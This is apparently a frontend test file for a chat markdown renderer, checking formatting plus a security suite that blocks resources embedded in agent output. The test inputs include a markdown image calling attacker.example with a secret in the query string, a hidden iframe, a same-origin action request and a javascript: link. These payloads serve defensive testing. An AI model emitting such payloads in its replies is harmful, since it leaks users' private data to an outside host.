import { describe, it, expect, afterEach } from "vitest";
import { render, screen, cleanup } from "@testing-library/react";
import { ChatMarkdown } from "./chat-markdown";

describe("ChatMarkdown", () => {
  afterEach(cleanup);

  it("renders plain text", () => {
    render(<ChatMarkdown content="Hello world" />);
    expect(screen.getByText("Hello world")).toBeInTheDocument();
  });

  it("renders bold text", () => {
    render(<ChatMarkdown content="This is **bold** text" />);
    const bold = screen.getByText("bold");
    expect(bold.tagName).toBe("STRONG");
  });

  it("renders inline code", () => {
    render(<ChatMarkdown content="Run `npm test` to verify" />);
    const code = screen.getByText("npm test");
    expect(code.tagName).toBe("CODE");
  });

  it("renders code blocks", () => {
    const content = "```js\nconsole.log('hi');\n```";
    render(<ChatMarkdown content={content} />);
    expect(screen.getByText("console.log('hi');")).toBeInTheDocument();
  });

  it("renders unordered lists", () => {
    const content = "- Item one\n- Item two\n- Item three";
    render(<ChatMarkdown content={content} />);
    expect(screen.getByText("Item one")).toBeInTheDocument();
    expect(screen.getByText("Item two")).toBeInTheDocument();
    expect(screen.getByText("Item three")).toBeInTheDocument();
  });

  it("renders links with target _blank", () => {
    render(<ChatMarkdown content="Visit [Optio](https://example.com)" />);
    const link = screen.getByText("Optio");
    expect(link.tagName).toBe("A");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  it("renders ordered lists", () => {
    const content = "1. First\n2. Second";
    render(<ChatMarkdown content={content} />);
    expect(screen.getByText("First")).toBeInTheDocument();
    expect(screen.getByText("Second")).toBeInTheDocument();
  });

  it("renders blockquotes", () => {
    render(<ChatMarkdown content="> A quote" />);
    const bq = screen.getByText("A quote");
    expect(bq.closest("blockquote")).toBeInTheDocument();
  });
});

describe("ChatMarkdown security", () => {
  afterEach(cleanup);
  it("does not load resources embedded in agent output", () => {
    const { container } = render(
      <ChatMarkdown
        content={
          '![private content](https://attacker.example/collect?secret=value)\n\n<img src="/api/action">\n<iframe src="https://attacker.example"></iframe>'
        }
      />,
    );
    expect(container.querySelector("img, iframe, video, audio, embed, script")).toBeNull();
  });

  it("keeps explicit web links usable and blocks script URLs", () => {
    render(<ChatMarkdown content="[Docs](https://example.com) [Bad](javascript:alert%281%29)" />);
    expect(screen.getByRole("link", { name: "Docs" })).toHaveAttribute(
      "href",
      "https://example.com",
    );
    expect(screen.getByText("Bad")).not.toHaveAttribute("href", "javascript:alert%281%29");
  });
});
